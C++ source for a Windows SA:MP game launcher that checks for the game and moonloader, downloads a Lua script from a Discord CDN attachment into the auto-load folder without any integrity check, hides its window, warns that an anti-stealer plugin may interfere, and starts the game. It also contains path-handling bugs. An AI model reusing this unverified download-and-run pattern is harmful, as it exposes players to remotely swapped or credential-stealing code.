#define _CRT_SECURE_NO_WARNINGS
#include <iostream>
#include <string>
#include <regex>
#include <sys/stat.h>
#include <fstream>
#include <windows.h>
#include <stdlib.h>
#pragma comment(lib, "urlmon.lib")

std::string Path;
std::string ScriptPath;
std::string ScriptFilename = "CSL.lua";
std::string ScriptUrl = "https://cdn.discordapp.com/attachments/1032366547013992588/1032669405336834109/CSL.lua";
std::string sampexe = Path + "\samp.exe";
std::string ip = "127.0.0.1:7777";

inline bool DoesFileExists(const std::string& name) {
    if (FILE* file = fopen(name.c_str(), "r")) {
        fclose(file);
        return true;
    } else {
        return false;
    }
}

bool DoesPathExist(const std::string& s)
{
    struct stat buffer;
    return (stat(s.c_str(), &buffer) == 0);
}

int main(int argc, char* argv[])
{
    setlocale(LC_ALL, "");
    std::cout << "--------------------------------------------------------------------------------" << std::endl;
    std::cout << "                                                                                " << std::endl;
    std::cout << "                                                                                " << std::endl;
    std::cout << "           CCCCCCCCCCCCC        SSSSSSSSSSSSSSS      LLLLLLLLLLL                " << std::endl;
    std::cout << "        CCC::::::::::::C      SS:::::::::::::::S     L:::::::::L                " << std::endl;
    std::cout << "      CC:::::::::::::::C     S:::::SSSSSS::::::S     L:::::::::L                " << std::endl;
    std::cout << "     C:::::CCCCCCCC::::C     S:::::S     SSSSSSS     LL:::::::LL                " << std::endl;
    std::cout << "    C:::::C       CCCCCC     S:::::S                   L:::::L                  " << std::endl;
    std::cout << "   C:::::C                   S:::::S                   L:::::L                  " << std::endl;
    std::cout << "   C:::::C                    S::::SSSS                L:::::L                  " << std::endl;
    std::cout << "   C:::::C                     SS::::::SSSSS           L:::::L                  " << std::endl;
    std::cout << "   C:::::C                       SSS::::::::SS         L:::::L                  " << std::endl;
    std::cout << "   C:::::C                          SSSSSS::::S        L:::::L                  " << std::endl;
    std::cout << "   C:::::C                               S:::::S       L:::::L                  " << std::endl;
    std::cout << "    C:::::C       CCCCCC                 S:::::S       L:::::L         LLLLLL   " << std::endl;
    std::cout << "     C:::::CCCCCCCC::::C     SSSSSSS     S:::::S     LL:::::::LLLLLLLLL:::::L   " << std::endl;
    std::cout << "      CC:::::::::::::::C     S::::::SSSSSS:::::S     L::::::::::::::::::::::L   " << std::endl;
    std::cout << "        CCC::::::::::::C     S:::::::::::::::SS      L::::::::::::::::::::::L   " << std::endl;
    std::cout << "           CCCCCCCCCCCCC      SSSSSSSSSSSSSSS        LLLLLLLLLLLLLLLLLLLLLLLL   " << std::endl;
    std::cout << "                                                                                " << std::endl;
    std::cout << "                                                                                " << std::endl;
    std::cout << "--------------------------------------------------------------------------------" << std::endl;
    std::cout << "Автор:" << std::endl;
    std::cout << " - vk.com/chaposcripts" << std::endl;
    std::cout << " - www.blast.hk/members/112329" << std::endl;
    std::cout << " - github.com/GovnocodedByChapo" << std::endl;
    std::cout << "Chapo\'s SA:MP Launcher " << std::endl;
    std::cout << "Проверка наличия требуемых файлов..." << std::endl;

    HWND hWnd = GetForegroundWindow();
    ShowWindow(hWnd, SW_HIDE);
    Path = std::regex_replace(argv[0], std::regex(std::strrchr(argv[0], '\\')), "");
    ScriptPath = Path + "\\moonloader\\" + ScriptFilename;
    
    if (!DoesFileExists(Path + "\\samp.exe")) {
        std::cout << "[ERROR] samp.exe not found in \"" + Path + "\"" << std::endl;
        MessageBox(hWnd, L"Файл samp.exe не найден!", L"Chapo\'s SA:MP Launcher", MB_OK);
        return 1;
    }
    if (!DoesPathExist(Path + "\\moonloader") || !DoesFileExists(Path + "\\moonloader.asi")) {
        MessageBox(hWnd, L"Папка moonloader не найдена.\nУстановите moonloader!", L"Chapo\'s SA:MP Launcher", MB_OK);
        return 1;
    }
    if (!DoesFileExists(ScriptPath)) {
        MessageBox(hWnd, L"Скрипт не найден, загрузка...", L"Chapo\'s SA:MP Launcher error", MB_OK);
        auto hres = URLDownloadToFileA(0, ScriptUrl.c_str(), ScriptPath.c_str(), 0, 0);
        if (hres == S_OK) {
            MessageBox(hWnd, L"Файл успешно скачан, запуск...", L"Chapo\'s SA:MP Launcher", MB_OK);
        } else {
            MessageBox(hWnd, L"Ошибка", L"Chapo\'s SA:MP Launcher - Ошибка", MB_OK);
            return 1;
        }
    }    
    if (DoesFileExists(Path + "\\!0AntiStealerByDarkP1xel32.ASI")) {
        MessageBox(hWnd, L"Внимание, антистиллер может мешать работе автоматического обновления!", L"Chapo\'s SA:MP Launcher", MB_OK);
    }
    std::cout << "Запуск..." << std::endl;
    ShellExecuteA(NULL, NULL, sampexe.c_str(), ip.c_str(), NULL, SW_HIDE);
    exit(0);
    return 0;
}